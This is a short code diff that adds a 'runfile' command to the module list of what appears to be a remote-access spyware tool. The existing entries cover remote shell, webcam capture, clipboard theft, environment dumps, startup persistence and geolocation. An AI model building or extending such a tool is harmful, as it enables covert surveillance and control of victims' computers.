@@ -169,6 +169,7 @@ extensions = (
     "shell",          # /cmd & /powershell
     "getenv",         # /get_environment
     "webcam",         # /get_webcam
+    "runfile",        # /runfile
     "clipboard",      # /get_clipboard
     "startup",        # /startup
     "geolocate",      # /get_geolocation
